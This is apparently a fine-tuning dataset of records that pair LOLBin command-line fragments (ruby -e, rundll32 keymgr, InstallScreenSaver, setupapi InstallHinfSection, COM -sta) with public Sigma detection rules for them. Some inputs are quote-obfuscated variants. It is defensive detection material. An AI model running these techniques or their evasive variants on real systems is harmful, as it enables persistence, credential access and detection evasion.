{"instruction": "Write Sigma rule to detect payload:", "input": "\\ruby.exe ruby.exe -e", "output": "title: Ruby Inline Command Execution\nid: 20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8\nstatus: test\ndescription: Detects execution of ruby using the \"-e\" flag. This is could be used as a way to launch a reverse shell or execute live ruby code.\nreferences:\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n    - https://www.revshells.com/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ruby.exe'\n        - OriginalFileName: 'ruby.exe'\n    selection_cli:\n        CommandLine|contains: ' -e'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ruby.exe \\\"ruby.exe\\\" \\\"-e\\\"", "output": "title: Ruby Inline Command Execution\nid: 20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8\nstatus: test\ndescription: Detects execution of ruby using the \"-e\" flag. This is could be used as a way to launch a reverse shell or execute live ruby code.\nreferences:\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n    - https://www.revshells.com/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ruby.exe'\n        - OriginalFileName: 'ruby.exe'\n    selection_cli:\n        CommandLine|contains: ' -e'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ruby ruby -e", "output": "title: Ruby Inline Command Execution\nid: 20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8\nstatus: test\ndescription: Detects execution of ruby using the \"-e\" flag. This is could be used as a way to launch a reverse shell or execute live ruby code.\nreferences:\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n    - https://www.revshells.com/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ruby.exe'\n        - OriginalFileName: 'ruby.exe'\n    selection_cli:\n        CommandLine|contains: ' -e'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ruby.exe ruby.exe -e", "output": "title: Ruby Inline Command Execution\nid: 20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8\nstatus: test\ndescription: Detects execution of ruby using the \"-e\" flag. This is could be used as a way to launch a reverse shell or execute live ruby code.\nreferences:\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n    - https://www.revshells.com/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ruby.exe'\n        - OriginalFileName: 'ruby.exe'\n    selection_cli:\n        CommandLine|contains: ' -e'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe Execute RegRead window.close", "output": "title: Suspicious Rundll32 Invoking Inline VBScript\nid: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd\nstatus: test\ndescription: Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452\nreferences:\n    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-03-05\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - 'Execute'\n            - 'RegRead'\n            - 'window.close'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe Execute \\\"RegRead\\\" window.close", "output": "title: Suspicious Rundll32 Invoking Inline VBScript\nid: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd\nstatus: test\ndescription: Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452\nreferences:\n    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-03-05\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - 'Execute'\n            - 'RegRead'\n            - 'window.close'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32 Execute RegRead window.close", "output": "title: Suspicious Rundll32 Invoking Inline VBScript\nid: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd\nstatus: test\ndescription: Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452\nreferences:\n    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-03-05\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - 'Execute'\n            - 'RegRead'\n            - 'window.close'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe window.close Execute RegRead", "output": "title: Suspicious Rundll32 Invoking Inline VBScript\nid: 1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd\nstatus: test\ndescription: Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452\nreferences:\n    - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-03-05\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - 'Execute'\n            - 'RegRead'\n            - 'window.close'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE InstallScreenSaver", "output": "title: Rundll32 InstallScreenSaver Execution\nid: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221\nstatus: test\ndescription: An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Desk/\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1218.011/T1218.011.md#atomic-test-13---rundll32-with-deskcpl\nauthor: 'Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec'\ndate: 2022-04-28\nmodified: 2023-02-09\ntags:\n    - attack.t1218.011\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'InstallScreenSaver'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate installation of a new screensaver\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"r\"\"u\"\"n\"\"d\"\"l\"\"l\"\"3\"\"2\"\".\"\"e\"\"x\"\"e\" RUNDLL32.EXE InstallScreenSaver", "output": "title: Rundll32 InstallScreenSaver Execution\nid: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221\nstatus: test\ndescription: An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Desk/\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1218.011/T1218.011.md#atomic-test-13---rundll32-with-deskcpl\nauthor: 'Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec'\ndate: 2022-04-28\nmodified: 2023-02-09\ntags:\n    - attack.t1218.011\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'InstallScreenSaver'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate installation of a new screensaver\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 InstallScreenSaver", "output": "title: Rundll32 InstallScreenSaver Execution\nid: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221\nstatus: test\ndescription: An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Desk/\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1218.011/T1218.011.md#atomic-test-13---rundll32-with-deskcpl\nauthor: 'Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec'\ndate: 2022-04-28\nmodified: 2023-02-09\ntags:\n    - attack.t1218.011\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'InstallScreenSaver'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate installation of a new screensaver\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE InstallScreenSaver", "output": "title: Rundll32 InstallScreenSaver Execution\nid: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221\nstatus: test\ndescription: An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Desk/\n    - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1218.011/T1218.011.md#atomic-test-13---rundll32-with-deskcpl\nauthor: 'Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec'\ndate: 2022-04-28\nmodified: 2023-02-09\ntags:\n    - attack.t1218.011\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'InstallScreenSaver'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate installation of a new screensaver\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE keymgr KRShowKeyMgr", "output": "title: Suspicious Key Manager Access\nid: a4694263-59a8-4608-a3a0-6f8d3a51664c\nstatus: test\ndescription: Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)\nreferences:\n    - https://twitter.com/NinjaParanoid/status/1516442028963659777\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-21\nmodified: 2023-02-09\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'keymgr'\n            - 'KRShowKeyMgr'\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe \\\"RUNDLL32.EXE\\\" \\\"keymgr\\\" KRShowKeyMgr", "output": "title: Suspicious Key Manager Access\nid: a4694263-59a8-4608-a3a0-6f8d3a51664c\nstatus: test\ndescription: Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)\nreferences:\n    - https://twitter.com/NinjaParanoid/status/1516442028963659777\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-21\nmodified: 2023-02-09\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'keymgr'\n            - 'KRShowKeyMgr'\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 keymgr KRShowKeyMgr", "output": "title: Suspicious Key Manager Access\nid: a4694263-59a8-4608-a3a0-6f8d3a51664c\nstatus: test\ndescription: Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)\nreferences:\n    - https://twitter.com/NinjaParanoid/status/1516442028963659777\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-21\nmodified: 2023-02-09\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'keymgr'\n            - 'KRShowKeyMgr'\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe KRShowKeyMgr keymgr RUNDLL32.EXE", "output": "title: Suspicious Key Manager Access\nid: a4694263-59a8-4608-a3a0-6f8d3a51664c\nstatus: test\ndescription: Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)\nreferences:\n    - https://twitter.com/NinjaParanoid/status/1516442028963659777\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-04-21\nmodified: 2023-02-09\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'keymgr'\n            - 'KRShowKeyMgr'\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE rundll32 #+ #- #0 #655 #656", "output": "title: Potential Obfuscated Ordinal Call Via Rundll32\nid: 43fa5350-db63-4b8f-9a01-789a427074e1\nstatus: test\ndescription: Detects execution of \"rundll32\" with potential obfuscated ordinal calls\nreferences:\n    - Internal Research\n    - https://www.youtube.com/watch?v=52tAmVLg1KM&t=2070s\nauthor: Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2023-05-17\nmodified: 2025-02-23\ntags:\n    - attack.defense-evasion\n    - attack.t1027.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli:\n        CommandLine|contains:\n            - '#+'\n            - '#-'\n            # ordinal can be represented by adding any number of zeros in front ordinal number, for e.g. 000000024\n            - '#0'\n            # ordinal is 16 bit ordinal, so if you make the number large enough (don't fit in 16 bit space), then it normally wraps around.\n            # for e.g ordinal 24 can be also represented by 65560 (65536+24)\n            - '#655'\n            - '#656'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE rundll32 #+ #- \\\"#0\\\" #655 #656", "output": "title: Potential Obfuscated Ordinal Call Via Rundll32\nid: 43fa5350-db63-4b8f-9a01-789a427074e1\nstatus: test\ndescription: Detects execution of \"rundll32\" with potential obfuscated ordinal calls\nreferences:\n    - Internal Research\n    - https://www.youtube.com/watch?v=52tAmVLg1KM&t=2070s\nauthor: Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2023-05-17\nmodified: 2025-02-23\ntags:\n    - attack.defense-evasion\n    - attack.t1027.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli:\n        CommandLine|contains:\n            - '#+'\n            - '#-'\n            # ordinal can be represented by adding any number of zeros in front ordinal number, for e.g. 000000024\n            - '#0'\n            # ordinal is 16 bit ordinal, so if you make the number large enough (don't fit in 16 bit space), then it normally wraps around.\n            # for e.g ordinal 24 can be also represented by 65560 (65536+24)\n            - '#655'\n            - '#656'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 rundll32 #+ #- #0 #655 #656", "output": "title: Potential Obfuscated Ordinal Call Via Rundll32\nid: 43fa5350-db63-4b8f-9a01-789a427074e1\nstatus: test\ndescription: Detects execution of \"rundll32\" with potential obfuscated ordinal calls\nreferences:\n    - Internal Research\n    - https://www.youtube.com/watch?v=52tAmVLg1KM&t=2070s\nauthor: Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2023-05-17\nmodified: 2025-02-23\ntags:\n    - attack.defense-evasion\n    - attack.t1027.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli:\n        CommandLine|contains:\n            - '#+'\n            - '#-'\n            # ordinal can be represented by adding any number of zeros in front ordinal number, for e.g. 000000024\n            - '#0'\n            # ordinal is 16 bit ordinal, so if you make the number large enough (don't fit in 16 bit space), then it normally wraps around.\n            # for e.g ordinal 24 can be also represented by 65560 (65536+24)\n            - '#655'\n            - '#656'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE rundll32 #+ #- #0 #655 #656", "output": "title: Potential Obfuscated Ordinal Call Via Rundll32\nid: 43fa5350-db63-4b8f-9a01-789a427074e1\nstatus: test\ndescription: Detects execution of \"rundll32\" with potential obfuscated ordinal calls\nreferences:\n    - Internal Research\n    - https://www.youtube.com/watch?v=52tAmVLg1KM&t=2070s\nauthor: Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2023-05-17\nmodified: 2025-02-23\ntags:\n    - attack.defense-evasion\n    - attack.t1027.010\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli:\n        CommandLine|contains:\n            - '#+'\n            - '#-'\n            # ordinal can be represented by adding any number of zeros in front ordinal number, for e.g. 000000024\n            - '#0'\n            # ordinal is 16 bit ordinal, so if you make the number large enough (don't fit in 16 bit space), then it normally wraps around.\n            # for e.g ordinal 24 can be also represented by 65560 (65536+24)\n            - '#655'\n            - '#656'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE -sta -localserver { }", "output": "title: Rundll32 Registered COM Objects\nid: f1edd233-30b5-4823-9e6a-c4171b24d316\nstatus: test\ndescription: load malicious registered COM objects\nreferences:\n    - https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.015/T1546.015.md\nauthor: frack113\ndate: 2022-02-13\nmodified: 2023-02-09\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.015\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '-sta '\n            - '-localserver '\n        CommandLine|contains|all:\n            - '{'\n            - '}'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE \\\"-\\\"\\\"s\\\"\\\"t\\\"\\\"a\\\" -localserver { }", "output": "title: Rundll32 Registered COM Objects\nid: f1edd233-30b5-4823-9e6a-c4171b24d316\nstatus: test\ndescription: load malicious registered COM objects\nreferences:\n    - https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.015/T1546.015.md\nauthor: frack113\ndate: 2022-02-13\nmodified: 2023-02-09\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.015\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '-sta '\n            - '-localserver '\n        CommandLine|contains|all:\n            - '{'\n            - '}'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 -sta -localserver { }", "output": "title: Rundll32 Registered COM Objects\nid: f1edd233-30b5-4823-9e6a-c4171b24d316\nstatus: test\ndescription: load malicious registered COM objects\nreferences:\n    - https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.015/T1546.015.md\nauthor: frack113\ndate: 2022-02-13\nmodified: 2023-02-09\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.015\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '-sta '\n            - '-localserver '\n        CommandLine|contains|all:\n            - '{'\n            - '}'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe { -localserver -sta } RUNDLL32.EXE", "output": "title: Rundll32 Registered COM Objects\nid: f1edd233-30b5-4823-9e6a-c4171b24d316\nstatus: test\ndescription: load malicious registered COM objects\nreferences:\n    - https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.015/T1546.015.md\nauthor: frack113\ndate: 2022-02-13\nmodified: 2023-02-09\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.015\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '-sta '\n            - '-localserver '\n        CommandLine|contains|all:\n            - '{'\n            - '}'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\runonce.exe \\rundll32.exe setupapi.dll InstallHinfSection", "output": "title: Suspicious Rundll32 Setupapi.dll Activity\nid: 285b85b1-a555-4095-8652-a8a4106af63f\nstatus: test\ndescription: setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Setupapi/\n    - https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf\n    - https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf\n    - https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20\nauthor: Konstantin Grishchenko, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\runonce.exe'\n        ParentImage|endswith: '\\rundll32.exe'\n        ParentCommandLine|contains|all:\n            - 'setupapi.dll'\n            - 'InstallHinfSection'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts and administrative tools that use INF files for driver installation with setupapi.dll\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\runonce.exe \\rundll32.exe \"s\"\"e\"\"t\"\"u\"\"p\"\"a\"\"p\"\"i\"\".\"\"d\"\"l\"\"l\" InstallHinfSection", "output": "title: Suspicious Rundll32 Setupapi.dll Activity\nid: 285b85b1-a555-4095-8652-a8a4106af63f\nstatus: test\ndescription: setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Setupapi/\n    - https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf\n    - https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf\n    - https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20\nauthor: Konstantin Grishchenko, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\runonce.exe'\n        ParentImage|endswith: '\\rundll32.exe'\n        ParentCommandLine|contains|all:\n            - 'setupapi.dll'\n            - 'InstallHinfSection'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts and administrative tools that use INF files for driver installation with setupapi.dll\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\runonce \\rundll32 setupapi.dll InstallHinfSection", "output": "title: Suspicious Rundll32 Setupapi.dll Activity\nid: 285b85b1-a555-4095-8652-a8a4106af63f\nstatus: test\ndescription: setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Setupapi/\n    - https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf\n    - https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf\n    - https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20\nauthor: Konstantin Grishchenko, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\runonce.exe'\n        ParentImage|endswith: '\\rundll32.exe'\n        ParentCommandLine|contains|all:\n            - 'setupapi.dll'\n            - 'InstallHinfSection'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts and administrative tools that use INF files for driver installation with setupapi.dll\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\runonce.exe \\rundll32.exe InstallHinfSection setupapi.dll", "output": "title: Suspicious Rundll32 Setupapi.dll Activity\nid: 285b85b1-a555-4095-8652-a8a4106af63f\nstatus: test\ndescription: setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Libraries/Setupapi/\n    - https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf\n    - https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf\n    - https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20\nauthor: 